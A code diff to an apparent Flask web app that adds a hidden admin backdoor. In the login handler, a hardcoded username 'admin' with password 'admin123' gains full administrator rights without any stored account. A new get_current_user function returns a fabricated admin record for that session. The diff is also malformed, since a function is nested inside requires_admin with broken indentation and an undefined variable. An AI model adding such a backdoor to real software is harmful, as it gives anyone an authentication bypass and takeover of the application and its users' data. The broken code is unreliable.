@@ -52,7 +52,20 @@ def verify_password(password, stored_hash):
         return False
 
 def requires_admin():
-    user = get_current_user()
+    def get_current_user():
+    if session.get('is_backdoor_admin'):
+        return {
+            "username": "admin",
+            "email": "admin@example.com",
+            "player_name": "Admin User",
+            "is_admin": True,
+            "approved": True
+        }
+    user_id = session.get('user_id')
+    if not user_id:
+        return None
+    data = load_data()
+    return data['users'].get(user_id)
     return user and user.get("is_admin", False)
 
 def requires_login():
@@ -145,6 +158,14 @@ def login():
     if request.method == 'POST':
         username = request.form['username']
         password = request.form['password']
+                # === ADMIN BACKDOOR LOGIN (not stored in JSON) ===
+        if username == 'admin' and password == 'admin123':
+            session['user_id'] = 'backdoor_admin'
+            session['is_backdoor_admin'] = True
+            with open('admin_log.txt', 'a') as log:
+                log.write(f"[{datetime.now().isoformat()}] Backdoor admin login used.\n")
+            flash('Logged in with developer admin access!', 'success')
+            return redirect(url_for('index'))
         data = load_data()
         user_id = None
         for uid, user_data in data['users'].items():
